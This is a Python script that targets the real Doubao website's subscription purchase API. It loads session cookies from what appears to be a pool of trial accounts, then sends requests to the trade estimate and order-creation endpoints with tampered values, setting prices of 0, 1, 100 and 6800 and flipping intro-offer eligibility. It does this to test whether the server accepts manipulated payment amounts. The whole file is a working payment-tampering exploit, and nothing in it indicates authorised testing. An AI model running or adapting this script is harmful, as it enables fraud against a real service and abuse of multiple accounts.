# -*- coding: utf-8 -*-
import json, requests, time
BASE="https://www.doubao.com"
UA=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 SamanthaDoubao/2.33.3")
SCOPE={"version_code":"20800","language":"zh","device_platform":"web","doubao_device_platform":"web",
 "aid":"497858","real_aid":"497858","pkg_type":"release_version","pc_version":"0.1.0",
 "doubao_pc_version":"0.1.0","region":"CN","sys_region":"CN","samantha_web":"1",
 "web_platform":"desktop","use-olympus-account":"1"}
H={"content-type":"application/json","agw-js-conv":"str","referer":BASE+"/member/subscription",
   "origin":BASE,"user-agent":UA,"accept":"application/json, text/plain, */*"}
raw=json.load(open("pool/trial_batch_212.json",encoding="utf-8"))["accounts"]
def sess(i):
    d={}
    for p in raw[i]["cookie_string"].split(";"):
        if "=" in p:
            k,v=p.split("=",1); d[k.strip()]=v.strip()
    s=requests.Session(); s.cookies.update(d); return s
SKU="doubao_personal_std"; CARD="doubao_personal_std_auto_renew_month"
s=sess(4)
print("=== estimate tamper ===")
for total in ("100","6800","0","1"):
    for elig in (True,False):
        body={"sku_key":SKU,"card_id":CARD,"purchase_channel":2,"support_diff_price":True,
              "timezone":-480,"total_price":total,"trade_extra":"{}",
              "is_eligible_for_intro_offer":elig}
        j=s.post(BASE+"/alice/commerce/sale/trade/estimate/",params=SCOPE,json=body,headers=H,timeout=25).json()
        d=j.get("data") or {}
        print("  total=%-5s elig=%-5s code=%-9s msg=%-14s pay=%s"%(total,elig,j.get("code"),
              str(j.get("message") or j.get("msg"))[:14], d.get("pay_amount") or d.get("estimated_pay_amount")))
print("=== create tamper ===")
for amt in ("100","1","0","6800"):
    body={"sku_key":SKU,"card_id":CARD,"estimated_pay_amount":amt,"purchase_channel":2,
          "upgrade_mode":0,"is_gift_deferred":False,"start_time":int(time.time()*1000),
          "trade_extra":"{}","is_eligible_for_intro_offer":False}
    j=s.post(BASE+"/alice/commerce/sale/trade/create/",params=SCOPE,json=body,headers=H,timeout=25).json()
    d=j.get("data") or {}
    print("  amt=%-5s code=%-9s msg=%-16s order=%s payurl=%s"%(amt,j.get("code"),
          str(j.get("message") or j.get("msg"))[:16], d.get("order_id"), (d.get("payment_credential") or {}).get("pay_url","")[:40]))